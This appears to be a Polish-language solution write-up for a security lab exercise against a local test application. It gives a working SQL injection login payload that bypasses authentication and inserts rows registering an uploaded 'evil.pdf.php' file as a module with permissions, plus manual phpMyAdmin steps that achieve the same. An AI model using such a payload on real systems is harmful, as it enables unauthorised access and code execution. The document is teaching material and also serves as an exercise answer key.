# Wykonanie [ROZWIĄZANIE]

## Metoda SQLi

Nie rozwodząc się za bardzo nad działaniem tego zapytania, w formularzu logowania należy wprowadzić:

```
Login: ' OR 1=1; INSERT INTO modules(path, name) VALUES ('../../uploads/evil.pdf.php', 'Evil'); INSERT INTO permissions(module_id, user_id) VALUES (2, 1); --

Hasło: <dowolne>
```

**Na końcu loginu jest spacja!**

## phpMyAdmin

1. Zaloguj się do panelu (localhost:8081) \
2. Rozwiń bazę danych **baim_db** \
3. Wybierz tabelę **modules**

![Widok phpmyadmin](images/phpmyadmin.png)

4. Przyciskiem na samej górze przejdź do zakładki **Insert**

![Przycisk insert](images/insert.png)

5. Wpisz następujące wartości (nie trzeba wpisywać id) i kliknij GO

![Widok insert modules](images/modules.png)

6. Następnie, przejdź do tabeli **permissions** i dodaj dla użytkownika **baim** (jego id jest równe 1) dostęp do modułu o id równym 2

![Widok insert permissions](images/permissions.png)

7. Tabele powinny wyglądać tak:

![Modules](images/modules1.png)
![Permissions](images/permissions1.png)

Po odświeżeniu panelu testowanej aplikacji (localhost:8080), powinien pojawić się moduł o nazwie **Evil**
